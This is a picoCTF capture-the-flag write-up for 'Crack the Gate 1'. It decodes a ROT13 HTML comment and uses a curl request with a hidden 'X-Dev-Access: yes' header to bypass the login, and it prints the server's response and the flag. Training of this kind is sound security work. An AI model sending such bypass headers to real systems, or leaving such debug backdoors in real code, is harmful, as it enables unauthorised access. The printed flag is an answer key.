# Crack the Gate 1 — picoCTF Writeup

## Challenge Info

| Field       | Details                                           |
|-------------|---------------------------------------------------|
| Name        | Crack the Gate 1                                  |
| Category    | Web Exploitation                                  |
| Platform    | picoCTF                                           |
| URL         | `http://amiable-citadel.picoctf.net:50016/`       |

**Description:**
We're in the middle of an investigation. One of our persons of interest, a CTF player, is believed to be hiding sensitive data inside a restricted web portal. We've uncovered the email address he uses to log in: `ctf-player@picoctf.org`. Unfortunately, we don't know the password, and the usual guessing techniques haven't worked. But something feels off — it's almost like the developer left a secret way in.

---

## Solution

### Step 1: View the Page Source

The first thing to do in any web challenge is to look at the source code. You can do this by right-clicking the page and selecting "View Page Source", or by using `curl`:

```bash
curl -s http://amiable-citadel.picoctf.net:50016/
```

Inside the HTML, there is a suspicious comment hidden near the top of the `<body>` tag:

```html
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
```

The second comment says "Remove before pushing to production!" — this tells us the developer accidentally left something behind that we're not supposed to see.

---

### Step 2: Decode the Hidden Message (ROT13)

The first comment looks like random characters, but it's actually encoded using **ROT13** — a simple cipher that shifts every letter by 13 positions in the alphabet (A becomes N, B becomes O, and so on).

You can decode it using the `tr` command in Linux:

```bash
echo "ABGR: Wnpx - grzcbenel olcnff: hfr urnqre K-Qri-Npprff: lrf" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

Or use any online ROT13 decoder (like rot13.com).

**Decoded result:**

> NOTE: Jack - temporary bypass: use header X-Dev-Access: yes

Now we know: a developer named **Jack** left a backdoor. By adding the HTTP header `X-Dev-Access: yes` to our request, we can skip the password check entirely.

---

### Step 3: Login Using the Backdoor Header

From the JavaScript code in the page source, we can see that the login form sends a `POST` request to `/login` with JSON data containing `email` and `password`.

We send the request with `curl`, adding the secret header:

```bash
curl -s -X POST http://amiable-citadel.picoctf.net:50016/login \
  -H "Content-Type: application/json" \
  -H "X-Dev-Access: yes" \
  -d '{"email":"ctf-player@picoctf.org","password":"anything"}'
```

The password can be literally anything — the backdoor header bypasses authentication completely.

**Server response:**

```json
{
  "success": true,
  "email": "ctf-player@picoctf.org",
  "firstName": "pico",
  "lastName": "player",
  "flag": "picoCTF{brut4_f0rc4_49d1d186}"
}
```

---

## Flag

```
picoCTF{brut4_f0rc4_49d1d186}
```

---

## Key Takeaways

1. **Always view the page source.** Developers sometimes leave comments, debug info, or credentials hidden in HTML comments that are invisible on the rendered page but fully readable in the source code.

2. **Recognize common encodings.** ROT13 is one of the most common light obfuscation methods used in CTFs. If you see text that looks like scrambled English letters, try ROT13 first.

3. **Custom HTTP headers can be a backdoor.** In this challenge, the developer added a debug header (`X-Dev-Access: yes`) that completely bypasses login authentication. In real-world security, always check for hidden or undocumented headers.

4. **Read the JavaScript.** The login form's JS code revealed the API endpoint (`/login`) and the expected request format (JSON with `email` and `password`), which was essential for crafting the correct `curl` command.
